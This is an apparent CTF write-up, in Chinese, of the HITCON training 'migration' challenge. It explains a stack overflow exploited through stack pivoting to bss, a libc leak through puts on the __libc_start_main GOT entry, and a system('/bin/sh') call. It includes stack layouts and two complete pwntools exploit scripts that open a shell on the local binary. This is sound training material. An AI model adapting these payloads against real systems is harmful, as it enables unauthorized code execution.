---
title: lab6_migration
date: 2019-07-11
categories: 
- hitcon_trainning
tags: stack leave_stack
---

**<font style="font-size:25px"> 栈溢出——栈迁移</font>**

# 错误思路

## 漏洞

栈溢出  
![avatar](https://img-blog.csdnimg.cn/20190711163002203.png)  
这里的buf溢出了0x40-0x28 个字节

checksec比较友好，没有开地址随机化。  

## 解决

是一个ret2libc的题目，返回到puts打印libc_start_main的got表地址，确定libc的版本。  
这里有一个问题就是我不知道这个count如果在我返回到libc_start_main的话是不是会被初始化，我先试一下。  
然后计算system和/bin/sh， 返回到这里。  

不行。因为这个libc的基址是后面计算才知道的，没法提前就写进去。

# 正确  


不是这么搞的= =，好累。  
正确的思路是栈迁移。

## 漏洞

   还是栈溢出啊。判断是栈迁移的原因有几点  
    1. 因为count那个地方其实是一个hint，告诉你ret2libc是行不通的。
    2. 能够构造成payload的长度是0x40-0x28其实只有0x18太短了。
    3. 因为system的地址是算出来的，所以要多次输入，也就是多次返回到read，但是不能直接返回到main函数里面，所以说需要直接返回到read，并且多次通过read再一次栈溢出控制程序流程，所以需要控制栈的地址。但是实在程序加载的时候你是没法确定栈地址的[反正我现在不可以确定]，于是就是栈迁移！

## 思路

   栈迁移的基本思路是用leave；ret；  

leave;ret;
```asm
mov %ebp,%esp
pop %ebp
pop %eip
```

这样就可以把esp劫持走。

这道题可以把栈迁移到bss。权限和大小是够的。  

过程    
1. 第一次系统自带的read栈溢出需要打印基址以及实现栈迁移。选择bss段一个中间位置，瞎选一个bss+0x500
栈的构造应该是
```asm
esp junk data
    ......
ebp bss+0x500
    put_plt
    pop1ret
    libc_start_main_got
    read_plt
    leave_ret
    0
    bss+0x500
    0x100
```

2. 第二次的栈溢出需要输入/bin/sh，然后执行system。  

栈的构造是
```asm
esp/ebp bss+0x400
        read_plt
        pop3ret
        0
        bss+0x400
        0x100
        system_addr
        0xdeadbeef
        bss+0x400(bin_sh_addr)

```
pop1ret和pop3ret：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190711163153310.png)    


**错误**： 第一次不能实现这么多功能，他只有0x18个数据，payload长度超了。  
所以要把他分成两次

1. 第一次

```asm
esp junk data
    ... ...
ebp bss+0x500
    read_plt
    leave_ret
    0
    bss+0x500
    0x100
```

2. 第二次

```asm
esp/ebp bss+0x400
        put_plt
        pop1ret
        libc_start_main_got
        read_plt
        leave_ret
        0
        bss+0x400
        0x100
```
3. 第三次

```asm
esp/ebp bss+0x500
        read_plt
        pop3ret
        0
        bss+0x500
        0x100
        system_addr
        0xdeadbeef
        bss+0x500
```

# exp


```python
from pwn import *
from LibcSearcher import *


context.log_level='debug'
sh=process('./migration')
elf=ELF("./migration")
pause()

libc_start_main_got=elf.got['__libc_start_main']
puts_plt=elf.plt['puts']
read_plt=elf.plt['read']
bss_addr=elf.bss()
pop1ret=0x0804836d
pop3ret=0x08048569
leave_ret=0x08048418
offset=0x28

#------------move stack-----------
payload=flat(['A'*offset,bss_addr+0x500,read_plt,leave_ret,0,bss_addr+0x500,0x100])
sh.sendafter("best :\n",payload)

#-----------leak libc base-------
payload=flat([bss_addr+0x400,puts_plt,pop1ret,libc_start_main_got,read_plt,leave_ret,0,bss_addr+0x400,0x100])
sh.send(payload)

libc_start_main_addr=u32(sh.recv()[0:4])

print 'libc_start_main_got---------->{:x}'.format(libc_start_main_addr)
libc=LibcSearcher('__libc_start_main',libc_start_main_addr)
libcbase=libc_start_main_addr-libc.dump('__libc_start_main')

system_addr=libcbase+libc.dump('system')
print 'system----------------------->{:x}'.format(system_addr)

#---------get shell---------------
payload=flat([bss_addr+0x500,read_plt,pop3ret,0,bss_addr+0x500,0x100,system_addr,0xdeadbeef,bss_addr+0x500])
sh.send(payload)
sh.send('/bin/sh\x00')

sh.interactive()
sh.close()
```

# 后记

本来想用libcsearch找/bin/sh的地址直接返回，但是谁能想到他太不争气了，和本机的libc版本不同导致不知道找了个啥东西，也不知道system是怎么找对的。
还被师傅骂一通TAT还diss我代码写的丑TAT
   
这里有一个trick，libc=elf.libc,然后就不用导入libc了。
```python
from pwn import *

context.log_level = 'debug'
sh = process('./migration')
elf = ELF("./migration")
libc = elf.libc
context.binary = "./migration"

libc_start_main_got = elf.got['__libc_start_main']
puts_plt = elf.plt['puts']
read_plt = elf.plt['read']
bss_addr = elf.bss()
pop1ret = 0x0804836d
pop3ret = 0x08048569
leave_ret = 0x08048418
offset = 0x28

#------------move stack-----------
payload=flat(['A'*offset,bss_addr+0x500,read_plt,leave_ret,0,bss_addr+0x500,0x100])
sh.sendafter("best :\n",payload)

#-----------leak libc base-------
payload=flat([bss_addr+0x400,puts_plt,pop1ret,libc_start_main_got,read_plt,leave_ret,0,bss_addr+0x400,0x100])
sh.send(payload)

libc_start_main_addr=u32(sh.recvn(4))

print 'libc_start_main_addr---------->{:x}'.format(libc_start_main_addr)
libc.address = libc_start_main_addr - libc.sym['__libc_start_main']

system_addr=libc.sym['system']
bin_sh_addr=libc.search('/bin/sh').next()
# pause()

print 'system----------------------->{:x}'.format(system_addr)

#---------get shell---------------
payload=flat([bss_addr+0x500,system_addr,0xdeadbeef,bin_sh_addr])
sh.send(payload)

sh.interactive()
sh.close()

```